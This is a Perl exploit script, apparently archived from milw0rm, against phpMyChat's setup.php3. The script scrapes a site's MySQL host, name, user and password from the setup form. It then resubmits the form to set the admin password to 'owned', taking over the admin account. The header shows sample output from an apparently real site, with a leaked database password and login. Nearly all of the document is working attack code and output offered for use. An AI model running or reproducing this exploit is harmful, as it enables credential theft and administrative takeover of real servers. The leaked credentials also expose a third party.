####################################################################
#
#  _____ _
# |  ___| | _____      ___
# | |_  | |/ _ \ \ /\ / /
# |  _| | | (_) \ V  V /
# |_|   |_|\___/ \_/\_/
#      Security Group.
#
#                    * phpMyChat remote sploit *                           
#                           by sysbug
#
# C:\Perl\bin>perl pmc.pl www.kublooddrive.com /chat
# /* Mysql dump :
# * C_DB_HOST : localhost
# * C_DB_NAME : jhawk_pchat1
# * C_DB_USER : jhawk_pchat1
# * C_DB_PASS : vvejTjeLgB
# *
# * Adding Admin ....
# * login:jhawk
# * pwd:owned
# */
# C:\Perl\bin>
# 
# Credits: all my friends!

use IO::Socket;

if(@ARGV < 2){
usage();
}
main();
sub sock(){
$ock=IO::Socket::INET->new(PeerAddr=>$host,PeerPort=>80,Proto=>'tcp',Timeout=>10)|| die " * s0ck null -\n";
print $ock "$path\r\n";
print $ock "Accept: */*\r\n";
print $ock "Accept-Language: pt\r\n";
print $ock "Accept-Encoding: gzip, deflate\r\n";
print $ock "User-Agent: l33t br0ws3r\r\n";
print $ock "Host: $host\r\n";
print $ock "Connection: Keep-Alive\r\n\r\n\r\n";
$path = '';
}
sub main(){
print "/*\n";
print " * sploit remote phpMychat\n";
print " *        by sysbug\n";
print " *\n";
$host = $ARGV[0];
$folder = $ARGV[1];
$path = "GET $folder/chat/setup.php3?next=1 HTTP/1.1";
sock();
$result =1;
while($recv = <$ock>){
if($recv =~ /(C_DB_PASS|C_DB_USER|C_DB_NAME|C_DB_HOST)(.*)(VALUE=)(")(.*)(">)/){
$c++;
print " * Mysql dump :\n" if($result);
print " * $1 : $5\n";
$mysql[$c] = $5;
$result = '';
}
else{
print " * sploit failed! \n";
print " *\\ \n";
exit;
}
}
close($ock);
$path = "GET $folder/chat/setup.php3?next=2&Form_Send=2&C_DB_TYPE=mysql&C_DB_HOST=$mysql[1]&C_DB_NAME=$mysql[2]&C_DB_USER=$mysql[3]&C_DB_PASS=$mysql[4]&C_MSG_TBL=messages&C_REG_TBL=reg_users&C_USR_TBL=users&C_BAN_TBL=ban_users&C_MSG_DEL=96&C_USR_DEL=4&C_REG_DEL=0&C_PUB_CHAT_ROOMS=Blood+Talk&C_PRIV_CHAT_ROOMS=&C_MULTI_LANG=1&C_LANGUAGE=english&C_REQUIRE_REGISTER=1&C_SHOW_ADMIN=1&C_SHOW_DEL_PROF=1&C_VERSION=1&C_BANISH=1&C_NO_SWEAR=1&C_SAVE=*&C_USE_SMILIES=1&C_HTML_TAGS_KEEP=simple&C_HTML_TAGS_SHOW=1&C_TMZ_OFFSET=0&C_MSG_ORDER=0&C_MSG_NB=20&C_MSG_REFRESH=10&C_SHOW_TIMESTAMP=1&C_NOTIFY=1&C_WELCOME=1 HTTP/1.1";
sock();
while($recv = <$ock>){
if($recv =~ /(ADM_LOG)(.*)(VALUE=)(")(.*)(">)/){
$c++;
$mysql[$c] = $5;
}
}
close($ock);
$pwd="owned";
$path = "GET $folder/chat/setup.php3?next=2&C_DB_TYPE=mysql&C_DB_HOST=$mysql[1]&C_DB_NAME=$mysql[2]&C_DB_USER=$mysql[3]&C_DB_PASS=$mysql[4]&C_MSG_TBL=messages&C_REG_TBL=reg_users&C_USR_TBL=users&C_BAN_TBL=ban_users&C_MSG_DEL=96&C_USR_DEL=4&C_REG_DEL=0&C_PUB_CHAT_ROOMS=Blood+Talk&C_PRIV_CHAT_ROOMS=&C_MULTI_LANG=1&C_LANGUAGE=english&C_REQUIRE_REGISTER=1&C_SHOW_ADMIN=1&C_SHOW_DEL_PROF=1&C_VERSION=1&C_BANISH=1&C_NO_SWEAR=1&C_SAVE=*&C_USE_SMILIES=1&C_HTML_TAGS_KEEP=simple&C_HTML_TAGS_SHOW=1&C_TMZ_OFFSET=0&C_MSG_ORDER=0&C_MSG_NB=20&C_MSG_REFRESH=10&C_SHOW_TIMESTAMP=1&C_NOTIFY=1&C_WELCOME=1&ADM_LOG=$mysql[5]&ADM_PASS=$pwd&Form_Send=3&Exist_Adm=1 HTTP/1.1";
sock();
if($mysql[5]){
print " *\n * Adding Admin ....\n * login:$mysql[5]\n * pwd:$pwd \n *\\ \n";
}
else{
print " * sploit failed! \n";
print " *\\ \n";
}
close($ock);
}
sub usage(){
print "/*\n";
print " * sploit remote phpMychat\n";
print " *        by sysbug\n";
print " * usage: perl $0 xpl.pl <host>\n";
print " * example: perl $0 xpl.pl www.site.com\n";
print " *          perl $0 xpl.pl www.site.com /chat\n";
print " */\n";
exit;
}

# milw0rm.com [2004-12-22]